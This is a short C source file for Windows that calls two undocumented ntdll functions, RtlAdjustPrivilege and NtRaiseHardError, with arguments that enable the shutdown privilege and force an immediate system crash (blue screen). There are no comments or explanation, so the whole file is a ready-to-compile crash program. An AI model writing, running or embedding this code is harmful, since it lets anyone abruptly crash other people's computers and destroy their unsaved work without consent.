#include <Windows.h>

#pragma comment(lib, "ntdll.lib")


EXTERN_C NTSTATUS NTAPI RtlAdjustPrivilege(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);

EXTERN_C NTSTATUS NTAPI NtRaiseHardError(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask, 
	PULONG_PTR Parameters, ULONG ValidResponseOption, PULONG Response);

int main()
{
	BOOLEAN bl;
	unsigned long response;
	RtlAdjustPrivilege(19, true, false, &bl);
	NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, 0, 6, &response);
	return 0;
}